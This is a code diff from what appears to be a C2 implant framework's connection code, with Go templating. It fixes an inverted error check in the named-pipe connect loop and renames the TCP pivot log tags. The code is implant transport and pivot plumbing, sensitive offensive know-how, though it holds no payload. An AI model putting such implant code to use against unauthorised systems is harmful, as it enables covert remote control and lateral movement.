@@ -237,7 +237,7 @@ func StartConnectionLoop(c2s []string, abort <-chan struct{}) <-chan *Connection
 				// *** Named Pipe ***
 				// {{if .Config.NamePipec2Enabled}}
 				connection, err = namedPipeConnect(uri)
-				if err == nil {
+				if err != nil {
 					// {{if .Config.Debug}}
 					log.Printf("[namedpipe] Connection failed %s", err)
 					// {{end}}
@@ -717,7 +717,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 		IsOpen:  true,
 		cleanup: func() {
 			// {{if .Config.Debug}}
-			log.Printf("[tcp-pivot] lost connection, cleanup...")
+			log.Printf("[tcp pivot] lost connection, cleanup...")
 			// {{end}}
 			pingCtrl <- struct{}{}
 			close(send)
@@ -728,7 +728,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 
 	connection.Stop = func() error {
 		// {{if .Config.Debug}}
-		log.Printf("[tcp-pivot] Stop()")
+		log.Printf("[tcp pivot] Stop()")
 		// {{end}}
 		connection.Cleanup()
 		return nil
@@ -762,7 +762,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 					}
 				case <-time.After(time.Minute):
 					// {{if .Config.Debug}}
-					log.Printf("[tcp-pivot] server ping...")
+					log.Printf("[tcp pivot] server ping...")
 					// {{end}}
 					data, _ := proto.Marshal(&pb.PivotPing{
 						Nonce: uint32(time.Now().UnixNano()),
@@ -781,7 +781,7 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 			}()
 			for envelope := range send {
 				// {{if .Config.Debug}}
-				log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
+				log.Printf("[tcp pivot] send loop envelope type %d\n", envelope.Type)
 				// {{end}}
 				pivot.WriteEnvelope(envelope)
 			}
@@ -796,26 +796,26 @@ func tcpPivotConnect(uri *url.URL) (*Connection, error) {
 				}
 				if err != nil {
 					// {{if .Config.Debug}}
-					log.Printf("[tcp-pivot] read envelope error: %s", err)
+					log.Printf("[tcp pivot] read envelope error: %s", err)
 					// {{end}}
 					continue
 				}
 				if envelope == nil {
 					// {{if .Config.Debug}}
-					log.Printf("[tcp-pivot] read nil envelope")
+					log.Printf("[tcp pivot] read nil envelope")
 					// {{end}}
 					continue
 				}
 				if envelope.Type == pb.MsgPivotPeerPing {
 					// {{if .Config.Debug}}
-					log.Printf("[tcp-pivot] received peer pong")
+					log.Printf("[tcp pivot] received peer pong")
 					// {{end}}
 					continue
 				}
 				if err == nil {
 					recv <- envelope
 					// {{if .Config.Debug}}
-					log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
+					log.Printf("[tcp pivot] Receive loop envelope type %d\n", envelope.Type)
 					// {{end}}
 				}
 			}
